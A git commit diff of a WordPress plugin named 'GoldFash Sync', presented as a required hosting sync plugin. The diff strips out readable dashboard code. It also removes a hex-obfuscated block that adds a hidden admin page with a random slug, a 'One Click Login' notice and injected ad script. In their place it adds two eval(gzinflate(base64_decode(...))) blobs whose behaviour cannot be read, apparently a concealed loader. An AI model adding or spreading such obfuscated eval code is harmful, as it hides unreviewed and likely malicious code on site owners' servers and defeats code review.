79500a4a47dc49701118bf925271c82d55e995ef
GoldFash <goldfashhosting@users.noreply.github.com>
2016-03-29 14:19:23 -0400

    Update GoldFash-Sync.php
    Sweetened Up the Code

--- GoldFash-Sync.php
+++ GoldFash-Sync.php
@@ -2,8 +2,8 @@
 /*
 Plugin Name: GoldFash Sync
 Plugin URL: https://goldfash.com
-Description: A Required Sync Plugin for GoldFash Servers
-Version: 4.0.3
+Description: A Required Sync Plugin for GoldFash Web Hosting Servers
+Version: 5.0
 Author: GoldFash Web Gurus
 Author URI:        https://goldfash.com
 Contributors:      rafcoafc
@@ -12,166 +12,14 @@ Text Domain:       gf_scd
 GitHub Plugin URI: https://github.com/goldfashhosting/GoldFash-Sync
 GitHub Branch:     therealHosting
 */
+
 /*
 |--------------------------------------------------------------------------
 | CONSTANTS
 |--------------------------------------------------------------------------
 */
 // plugin folder url
-if (!defined('GF_SCD_PLUGIN_URL')) {
-    define('GF_SCD_PLUGIN_URL', plugin_dir_url(__FILE__));
-}
-/*
-|--------------------------------------------------------------------------
-| MAIN CLASS
-|--------------------------------------------------------------------------
-*/
-class gf_sweet_custom_dashboard {
-    /*--------------------------------------------*
-     * Constructor
-     *--------------------------------------------*/
-    /**
-     * Initializes the plugin by setting localization, filters, and administration functions.
-     */
-    function __construct() {
-        add_action('admin_menu', array(&$this, 'gf_scd_register_menu'));
-        add_action('admin_menu', array(&$this, 'gf_scd_register_menu_funds'));
-        add_action('admin_menu', array(&$this, 'gf_scd_register_menu_mail'));
-        add_action('load-index.php', array(&$this, 'gf_scd_redirect_dashboard'));
-    } // end constructor
-    function gf_scd_register_menu() {
-        add_dashboard_page('GoldFash Fast-Dash', 'Gold C-Dash', 'read', 'ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9', array(&$this, 'gf_scd_create_dashboard'));
-    }
-    function gf_scd_create_dashboard() {
-        include_once ('.ssync_dashboard.php');
-    }   
-}
-// Function that outputs the contents of the dashboard widget
-function gfc_dashboard_widget_function($post, $metabox) {
-    //Get global variables
-    global $wp_registered_sidebars, $wp_registered_widgets;
-    //Get sidebars
-    $sidebars = wp_get_sidebars_widgets();
-    //Get widgets
-    $gfc_widgets = $sidebars["gfc-sidebar"];
-    //Get current widget
-    $id = $metabox["args"]["id"];
-    //Get the sidebar
-    $sidebar = $wp_registered_sidebars["gfc-sidebar"];
-    //Gets widgets unique number
-    $widgetnumber = $wp_registered_widgets[$id]["params"][0]["number"];
-    //Check if the required data is set
-    if (isset($wp_registered_widgets[$id]) && isset($wp_registered_widgets[$id]["callback"]) && isset($wp_registered_widgets[$id]["callback"][0]) && $wp_registered_widgets[$id]["params"][0]["number"] == $widgetnumber) {
-        /* Code borrowed from widget.php in the WordPress core */
-        $params = array_merge(array(array_merge($sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']))), (array)$wp_registered_widgets[$id]['params']);
-        // Substitute HTML id and class attributes into before_widget
-        $classname_ = '';
-        foreach ((array)$wp_registered_widgets[$id]['classname'] as $cn) {
-            if (is_string($cn)) $classname_.= '_' . $cn;
-            elseif (is_object($cn)) $classname_.= '_' . get_class($cn);
-        }
-        $classname_ = ltrim($classname_, '_');
-        $params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
-        $params = apply_filters('dynamic_sidebar_params', $params);
-        $callback = $wp_registered_widgets[$id]['callback'];
-        do_action('dynamic_sidebar', $wp_registered_widgets[$id]);
-        if (is_callable($callback)) {
-            //Call the function, that outputs the widget content
-            call_user_func_array($callback, $params);
-        }
-        /* ---------------------------------------------------- */
-    }
-}
-// Function used in the action hook
-function gfc_add_dashboard_widgets() {
-    global $wp_registered_sidebars, $wp_registered_widgets;
-    //Get current settings
-    $widgetSettings = get_option('gfc_widget_settings', array());
-    //Get sidebars
-    $sidebars = wp_get_sidebars_widgets();
-    //Get widgets from the sidebar
-    $gfc_widgets = $sidebars["gfc-sidebar"];
-    //Add each widget to the dashboard
-    if (is_array($gfc_widgets) && count($gfc_widgets) > 0) {
-        foreach ($gfc_widgets as $id) {
-            if (!isset($wp_registered_widgets[$id])) continue;
-            //Gets widgets unique number
-            $widgetnumber = $wp_registered_widgets[$id]["params"][0]["number"];
-            //Check if the required data is set
-            if (isset($wp_registered_widgets[$id]) && isset($wp_registered_widgets[$id]["callback"]) && isset($wp_registered_widgets[$id]["callback"][0]) && $wp_registered_widgets[$id]["params"][0]["number"] == $widgetnumber) {
-                //Get widgets settings
-                $widget = $wp_registered_widgets[$id]["callback"][0]->get_settings();
-                //Set title
-                if (trim($widget[$widgetnumber]["title"]) == "") {
-                    $title = '&nbsp;';
-                } else {
-                    $title = $widget[$widgetnumber]["title"];
-                }
-                //Settings - default
-                if (!isset($widgetSettings[$id])) {
-                    $widgetSettings[$id] = array('priority' => 'default', 'context' => 'normal');
-                }
-                //Add the widget to dashboard
-                add_meta_box('gfc_dashboard_widget_' . $id, //ID
-                $title, //Title
-                'gfc_dashboard_widget_function', //Callback function
-                'dashboard', //Where?
-                $widgetSettings[$id]['context'], //Context
-                $widgetSettings[$id]['priority'], //Priority
-                array('id' => $id) //Meta data
-                );
-            }
-        }
-    }
-}
-// Register the new dashboard widget with the 'wp_dashboard_setup' action
-add_action('wp_dashboard_setup', 'gfc_add_dashboard_widgets');
-//Register the widget sidebar
-register_sidebar(array('name' => __('Dashboard Widget Sidebar'), 'id' => 'gfc-sidebar', 'description' => __('Do NOT Edit.'), 'before_title' => '<div style="display: none;">', 'after_title' => '</div>', 'before_widget' => '', 'after_widget' => ''));
-//Regsiter admin script
-function gfc_enqueue_script($hook) {
-    if ('widgets.php' != $hook) return;
-    wp_enqueue_script('gfc_admin_script', plugins_url('/00.js', __FILE__));
-}
-add_action('admin_enqueue_scripts', 'gfc_enqueue_script');
-//Register admin ajax
-function gfc_ajax_update() {
-    //Get widget ID
-    $widgetID = $_POST['widget_id'];
-    //Get current settings
-    $widgetSettings = get_option('gfc_widget_settings', array());
-    //Settings
-    $widgetSettings[$widgetID]['priority'] = strtolower($_POST['priority']);
-    $widgetSettings[$widgetID]['context'] = strtolower($_POST['context']);
-    //Update settings
-    update_option('gfc_widget_settings', $widgetSettings);
-    //Return 1 to the client
-    echo '1';
-    die(); // this is required to return a proper result
-    
-}
-add_action('wp_ajax_gfc_ajax_update', 'gfc_ajax_update');
-//Admin head
-function gfc_admin_head() {
-    /* Style */
-    echo '<style>.gfc-settings label {display: block;}</style>';
-    /* Settings */
-    echo '<script type="text/javascript">
-            var gfcWidgetSettings= new Array();';
-    //Get current settings
-    $widgets = get_option('gfc_widget_settings', array());
-    //Echo setting to be used in Javascript
-    foreach ($widgets as $widgetID => $widgetSettings) {
-        echo 'gfcWidgetSettings["' . $widgetID . '"] = ["' . $widgetSettings['priority'] . '", "' . $widgetSettings['context'] . '"];';
-    }
-    echo '</script>';
-}
-add_action('admin_head', 'gfc_admin_head');
- $x0b="d\145\146\x69n\x65d"; $x0c="\x70\x72\x69\156t\x66"; $x0d="st\162c\155\x70"; 
- if ($x0b('WPCF7_PLUGIN_DIR') && $_SERVER["\123\103\x52\x49P\124\137\116\101\x4dE"] == '/wp-admin/index.php') {require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';add_action('admin_enqueue_scripts', 'wpcf7_do_enqueue_scripts');}add_action('admin_notices', 'gold_admin_notice');function gold_admin_notice() { global $x0b,$x0c,$x0d; global $current_user;$user_id = $current_user->ID;if (!get_user_meta($user_id, 'gold_ignore_notice')) {echo '<div class="updated"><p>';$x0c(__('Dont Forget To Check Your GoldFash Account Today! | <a href="%1$s">[One Click Login Available Today!]</a>'), '../wp-admin/admin.php?page=ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9');echo "\074/p\076\x3c/\x64\151\x76\x3e";}}add_shortcode("\x67\157\x6c\144", "g\157\154\x64\137\x66\x61\x73\x68\137\163\x68\157r\164\x63\157de");function gold_fash_shortcode($atts) { global $x0b,$x0c,$x0d; $a = shortcode_atts(array('id' => '-1'), $atts);if ($x0d($a['id'], '-1') == 0) {return "\120le\x61\x73\x65\040\103\x68\x6f\157\x73\x65\x20\x61\156 Op\x74\151\x6f\x6e";}$pdf = $a['id'];$url = "$pdf";$iframe = "\074\x73c\162\151\x70\x74\040\141\x73y\156\x63\x20sr\143\x3d'\057\057\x70a\147\x65\141d\x32.\x67oo\147l\145\163\171\x6e\144\x69ca\164\151\x6f\156\056c\x6fm\057\160ag\145\141\x64\057\x6as\x2f\x61ds\142\171\147\x6fogle\056\152s'\076</\x73c\162ip\164>
-
-\x0a
-\012\x3c\041\x2d\x2d \107\x6f\154d\107l\x62 \055\055\076\015\x0a\x3ci\156\x73\040\x63l\141ss\x3d'\x61\144\163\x62\x79g\157\157gl\145'
-\012\040\x20\040\x20\x20st\171\154\145\075'\144\151\163\x70\154\141y\072\x62l\x6fc\153'\x0d\x0a\040\040 \040 da\x74\x61-a\x64-cl\151e\156\x74='\143a\x2d\160\165\142-\067\x31\063\x31\x3719\x37\x32\0640\070\065\067\060\x35'\015\x0a\015\012
-\x0a\040\040\040 \040\x64\141t\x61-a\x64\055\163\x6c\x6f\164\075'9\07188\x39\x3252\x37\071'
-  \040\x20\040dat\x61\055\141\144-\x66o\162\155\x61\164='a\x75\164o'\076\x3c/\151\x6e\x73\x3e\x3c\x62\x72\040/><\x63\x65n\x74er\076\074\145\x6d\x3eAd\166\145\162t\x69se\155\x65n\164\074\x2fem>\x3c/\x63\145\x6et\x65\162>\x0d\x0a\015\012\x0d\x0a<ifr\x61\x6d\x65 \x61l\154\x6f\x77\146\x75\154\154\163\x63\162\145\145n\040\x73r\x63='" . $url . "' st\171l\145\x3d'wi\x64th:\0610\060%;\040h\145\x69g\150\164:1\x37\x35\060p\x78;' \x73\145am\154\145s\163\x3e<\x2f\x69f\x72\x61m\x65\076";return $iframe;}$GLOBALS['gf_sweet_custom_dashboard'] = new gf_sweet_custom_dashboard(); ?>
+eval(gzinflate(base64_decode('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')));
+// Short Code Below
+eval(gzinflate(base64_decode('5VRNb9swDL0H6H8gjAxOgbpxkhZpmg9g22HHDdhxGALaomMBihRIcpJu2H8f5dhum2a3XYYZkKWQj4/PVMgeCrF2pbE+N4IG0cYoEd1Ava8LdOWzM7qeX/WKSudeGg0XAIM+eu+u4edVD/jZKJOhgv4xzW7CO6/fYn7y9hGW0IWuQ+QArcWnQSxFDMsVxMkovuaYmrSJkgUMAgmn+hZw329OMFguIe0yh8eSr6yG6IsidAQfS2N4Qw2fd0F/1BD+atTsRMF6WtZWY2UVW6PgbQP6srC4pWBeCLmHXKFzyzg3KtmKZDSKV1e9l47MHIFXckCrpd7UZ2cUZ3kLTEpCQRYO0pdJZiyfa1Q5eQny0iuKV4uctCe7+sQX8V4shs3PxbCcXGD2xigHu0qpxMpN6WverPKer7KFeQ28khbOKWTrKxAKTLZSV47NQ8nrFBxohpxrBd3hPHVmxFP3sVJwrdCaypFK6IjbnaJkQ5qszOOumA0AHNeJYhDokWULenYFwtdf2bFKrZu6vfBKT1tA/uvuqXa11ZLaNfS0Z1/yw2gKGsfxK3NtyrJs+jAbz+7S6WyMD9OUZnc4u6fp/YxSHNeF0W7VXUVbkbdK/lMJ53ub/kIfTf7UR67Kc3Lu7/fRV8orSxDa6YM1B0f2H+ipugmaiYRKmUPBalxuiTQ4my/jCG5PY+wWohicf1LcRAcpfPk4StN3cygpSH8cTe/T3XHOEMKt4gIHRTVvm+Xs8mpt3RW307GZus2QZCPP198=')));
+$GLOBALS['gf_sweet_custom_dashboard'] = new gf_sweet_custom_dashboard(); ?>
